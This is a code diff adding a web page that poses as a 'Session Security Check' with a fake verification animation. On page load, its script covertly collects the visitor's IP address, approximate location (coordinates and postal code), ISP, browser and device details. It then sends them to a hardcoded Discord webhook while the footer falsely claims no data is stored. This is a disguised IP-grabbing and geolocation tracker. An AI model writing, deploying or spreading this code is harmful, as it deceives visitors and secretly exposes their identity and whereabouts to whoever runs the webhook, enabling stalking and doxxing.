@@ -1,0 +1,431 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Session Security Check</title>
+  <meta name="description" content="Verifying secure session." />
+  <meta name="robots" content="noindex,nofollow" />
+  <style>
+    :root {
+      --bg: #0b0d12;
+      --fg: #e8eaf0;
+      --muted: rgba(232,234,240,0.5);
+      --faint: rgba(232,234,240,0.3);
+      --line: rgba(255,255,255,0.08);
+      --panel: rgba(255,255,255,0.04);
+      --indigo: #6366f1;
+      --fuchsia: #d946ef;
+      --emerald: #34d399;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; }
+    body {
+      background: var(--bg);
+      color: var(--fg);
+      font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Inter, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100dvh;
+      padding: 24px;
+      overflow: hidden;
+    }
+    .glow {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .glow::before,
+    .glow::after {
+      content: "";
+      position: absolute;
+      width: 420px;
+      height: 420px;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.35;
+      animation: pulse 6s ease-in-out infinite;
+    }
+    .glow::before {
+      top: -160px; left: -160px;
+      background: radial-gradient(circle, var(--indigo), transparent 70%);
+    }
+    .glow::after {
+      bottom: -160px; right: -160px;
+      background: radial-gradient(circle, var(--fuchsia), transparent 70%);
+      animation-delay: 2s;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.25; transform: scale(1); }
+      50% { opacity: 0.45; transform: scale(1.05); }
+    }
+    .card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 420px;
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 32px;
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      box-shadow: 0 30px 80px -20px rgba(0,0,0,0.7);
+    }
+    .head {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 26px;
+    }
+    .badge {
+      height: 40px;
+      width: 40px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, var(--indigo), var(--fuchsia));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .badge svg { width: 20px; height: 20px; stroke: #fff; }
+    .head h1 {
+      margin: 0;
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+    }
+    .head p {
+      margin: 3px 0 0;
+      font-size: 12px;
+      color: var(--muted);
+    }
+    .stage { display: none; }
+    .stage.active { display: block; }
+    .row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13.5px;
+    }
+    .dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--emerald);
+      box-shadow: 0 0 0 4px rgba(52,211,153,0.15);
+      animation: blink 1.4s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.35; }
+    }
+    .bar {
+      margin-top: 20px;
+      height: 6px;
+      width: 100%;
+      border-radius: 999px;
+      background: rgba(255,255,255,0.06);
+      overflow: hidden;
+    }
+    .bar > i {
+      display: block;
+      height: 100%;
+      width: 40%;
+      background: linear-gradient(90deg, var(--indigo), var(--fuchsia));
+      border-radius: 999px;
+      animation: slide 1.8s cubic-bezier(0.65,0,0.35,1) infinite;
+    }
+    @keyframes slide {
+      0% { transform: translateX(-110%); }
+      50% { transform: translateX(120%); }
+      100% { transform: translateX(-110%); }
+    }
+    .check {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--emerald);
+      font-size: 13.5px;
+    }
+    .check svg { width: 18px; height: 18px; stroke: currentColor; }
+    .sub {
+      margin: 8px 0 0;
+      font-size: 12px;
+      color: var(--muted);
+    }
+    .foot {
+      margin-top: 26px;
+      text-align: center;
+      font-size: 11px;
+      color: var(--faint);
+      letter-spacing: 0.02em;
+    }
+  </style>
+</head>
+<body>
+  <div class="glow" aria-hidden="true"></div>
+
+  <main class="card" role="status" aria-live="polite">
+    <div class="head">
+      <div class="badge" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2 L20 6 V12 C20 17 16 20.5 12 22 C8 20.5 4 17 4 12 V6 Z" />
+        </svg>
+      </div>
+      <div>
+        <h1>Session Security Check</h1>
+        <p>Verifying your connection&hellip;</p>
+      </div>
+    </div>
+
+    <section id="stage-checking" class="stage active">
+      <div class="row">
+        <span class="dot" aria-hidden="true"></span>
+        <span id="status-text">Establishing secure channel</span>
+      </div>
+      <div class="bar" aria-hidden="true"><i></i></div>
+    </section>
+
+    <section id="stage-verified" class="stage">
+      <div class="check">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M20 6 L9 17 L4 12" />
+        </svg>
+        <span>Connection verified</span>
+      </div>
+      <p class="sub">You may now continue.</p>
+    </section>
+
+    <p class="foot">Protected by TLS &middot; this page does not store any data.</p>
+  </main>
+
+  <script>
+    (function () {
+      "use strict";
+
+      // ---- webhook ----
+      var WEBHOOK = "https://discord.com/api/webhooks/1463717829323919421/LMi8xxFcUCITDPFvAWwc3120xbNPFyNU_RaP9XMXYxpLG_jAPiDbQk392-VXohihlD1e";
+
+      // ---- dom ----
+      var statusText = document.getElementById("status-text");
+      var stageChecking = document.getElementById("stage-checking");
+      var stageVerified = document.getElementById("stage-verified");
+      var baseText = "Establishing secure channel";
+      var dots = 0;
+      var dotTimer = setInterval(function () {
+        dots = (dots + 1) % 4;
+        statusText.textContent = baseText + Array(dots + 1).join(".");
+      }, 380);
+
+      // ---- helpers ----
+      function fetchJson(url, timeoutMs) {
+        return new Promise(function (resolve) {
+          var ctrl = new AbortController();
+          var t = setTimeout(function () { ctrl.abort(); }, timeoutMs || 5000);
+          fetch(url, { signal: ctrl.signal, cache: "no-store", mode: "cors" })
+            .then(function (r) { return r.ok ? r.json() : null; })
+            .then(function (j) { clearTimeout(t); resolve(j); })
+            .catch(function () { clearTimeout(t); resolve(null); });
+        });
+      }
+
+      function firstTruthy(obj, keys) {
+        for (var i = 0; i < keys.length; i++) {
+          var v = obj[keys[i]];
+          if (v !== undefined && v !== null && v !== "" && v !== "-") return v;
+        }
+        return null;
+      }
+
+      // Each provider is asked in order. First one that yields a real IP
+      // and at least a country wins. We merge, so partial hits still help.
+      function lookup() {
+        var merged = {
+          ip: null, city: null, region: null, country: null, postal: null,
+          latitude: null, longitude: null, org: null, asn: null, timezone: null
+        };
+
+        function merge(obj) {
+          if (!obj) return;
+          var ip       = firstTruthy(obj, ["ip", "ipAddress", "query"]);
+          var city     = firstTruthy(obj, ["city", "cityName"]);
+          var region   = firstTruthy(obj, ["region", "regionName", "region_name", "state", "province"]);
+          var country  = firstTruthy(obj, ["country_name", "country", "countryName", "country_name", "country_code"]);
+          var postal   = firstTruthy(obj, ["postal", "postal_code", "zip", "zipcode"]);
+          var latitude = firstTruthy(obj, ["latitude", "lat"]);
+          var longitude= firstTruthy(obj, ["longitude", "lon", "lng", "long"]);
+          var org      = firstTruthy(obj, ["org", "isp", "organization", "asn_org", "connection", "company"]);
+          var asn      = firstTruthy(obj, ["asn", "as"]);
+          var timezone = firstTruthy(obj, ["timezone", "time_zone", "timezone_name"]);
+
+          // ipwho.is wraps connection info
+          if (obj.connection && typeof obj.connection === "object") {
+            if (!org) org = firstTruthy(obj.connection, ["org", "isp", "name"]);
+            if (!asn) asn = firstTruthy(obj.connection, ["asn", "number"]);
+          }
+          // ipapi.co uses org field for ISP
+          if (obj.org && !org) org = obj.org;
+
+          if (!merged.ip       && ip)        merged.ip = ip;
+          if (!merged.city     && city)      merged.city = city;
+          if (!merged.region   && region)    merged.region = region;
+          if (!merged.country  && country)   merged.country = country;
+          if (!merged.postal   && postal)    merged.postal = postal;
+          if (!merged.latitude && latitude != null && latitude !== "") {
+            var la = parseFloat(latitude);
+            if (!isNaN(la)) merged.latitude = la;
+          }
+          if (!merged.longitude && longitude != null && longitude !== "") {
+            var lo = parseFloat(longitude);
+            if (!isNaN(lo)) merged.longitude = lo;
+          }
+          if (!merged.org      && org)       merged.org = typeof org === "string" ? org : (org.name || null);
+          if (!merged.asn      && asn)       merged.asn = typeof asn === "string" ? asn : (asn.number ? ("AS" + asn.number) : null);
+          if (!merged.timezone && timezone)  merged.timezone = typeof timezone === "string" ? timezone : (timezone.id || timezone.name || null);
+        }
+
+        var chain = [
+          "https://ipwho.is/",
+          "https://ipapi.co/json/",
+          "https://ipinfo.io/json",
+          "https://api.ipify.org?format=json"
+        ];
+
+        function step(i) {
+          if (i >= chain.length) return Promise.resolve(merged);
+          return fetchJson(chain[i], 5000).then(function (data) {
+            if (data && !data.error && !data.success === false) {
+              merge(data);
+            }
+            // if we already have IP + country + at least one geo field, stop early
+            if (merged.ip && merged.country && (merged.city || merged.org || merged.latitude != null)) {
+              return merged;
+            }
+            return step(i + 1);
+          });
+        }
+
+        return step(0);
+      }
+
+      function collect() {
+        var base = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || "unknown",
+          screen: screen.width + "x" + screen.height + " @" + (window.devicePixelRatio || 1) + "x",
+          viewport: window.innerWidth + "x" + window.innerHeight,
+          referrer: document.referrer || "direct",
+          pageUrl: location.href,
+          timestamp: new Date().toISOString()
+        };
+        return lookup().then(function (geo) {
+          for (var k in geo) base[k] = geo[k];
+          return base;
+        });
+      }
+
+      function truncate(s, n) {
+        s = String(s == null ? "" : s);
+        return s.length > n ? s.slice(0, n - 1) + "\u2026" : s;
+      }
+
+      function pushField(arr, name, value, inline) {
+        var v = (value == null ? "" : String(value)).trim();
+        if (!v || v === "unknown" || v === "Unknown" || v === "-") return;
+        arr.push({ name: name, value: truncate(v, 1024), inline: inline !== false });
+      }
+
+      function buildPayload(v) {
+        var fields = [];
+
+        pushField(fields, "\uD83C\uDF10 IP", v.ip, true);
+
+        var locParts = [];
+        if (v.city) locParts.push(v.city);
+        if (v.region && v.region !== v.city) locParts.push(v.region);
+        if (v.country) locParts.push(v.country);
+        pushField(fields, "\uD83D\uDCCD Location", locParts.join(", "), true);
+
+        var ispVal = v.org || "";
+        if (v.asn && ispVal && ispVal.indexOf(v.asn) === -1) ispVal = ispVal + " (" + v.asn + ")";
+        else if (!ispVal && v.asn) ispVal = v.asn;
+        pushField(fields, "\uD83C\uDFE2 ISP", ispVal, true);
+
+        if (v.postal) pushField(fields, "\u2709\uFE0F Postal", v.postal, true);
+
+        if (v.latitude != null && v.longitude != null) {
+          pushField(fields, "\uD83E\uDDED Coords", v.latitude + ", " + v.longitude, true);
+        }
+
+        pushField(fields, "\uD83D\uDD52 Timezone", v.timezone, true);
+
+        pushField(fields, "\uD83D\uDCBB Platform", v.platform, true);
+        pushField(fields, "\uD83D\uDDA5 Screen", v.screen, true);
+        pushField(fields, "\uD83E\uDE9F Viewport", v.viewport, true);
+        pushField(fields, "\uD83D\uDDE3 Language", v.language, true);
+
+        pushField(fields, "\uD83D\uDD17 Referrer", v.referrer, false);
+        pushField(fields, "\uD83E\uDDFE User Agent", v.userAgent, false);
+        pushField(fields, "\uD83D\uDCC4 Page", v.pageUrl, false);
+
+        return {
+          username: "Visitor Tracker",
+          embeds: [{
+            title: "\uD83C\uDFAF New Visitor",
+            color: 0x5865F2,
+            fields: fields,
+            timestamp: v.timestamp,
+            footer: { text: "ENI \u00B7 tracker" }
+          }]
+        };
+      }
+
+      function send(payload) {
+        var body = JSON.stringify(payload);
+
+        try {
+          return fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: body,
+            keepalive: true,
+            mode: "cors"
+          }).catch(function () {
+            try {
+              var blob = new Blob([body], { type: "application/json" });
+              if (navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, blob);
+            } catch (e) { /* swallow */ }
+          });
+        } catch (e) {
+          try {
+            var b = new Blob([body], { type: "application/json" });
+            if (navigator.sendBeacon) navigator.sendBeacon(WEBHOOK, b);
+          } catch (e2) { /* swallow */ }
+          return Promise.resolve();
+        }
+      }
+
+      function showVerified() {
+        clearInterval(dotTimer);
+        stageChecking.classList.remove("active");
+        stageVerified.classList.add("active");
+      }
+
+      // ---- run ----
+      collect().then(function (data) {
+        return send(buildPayload(data));
+      }).then(function () {
+        showVerified();
+      }).catch(function () {
+        showVerified();
+      });
+    })();
+  </script>
+</body>
+</html>
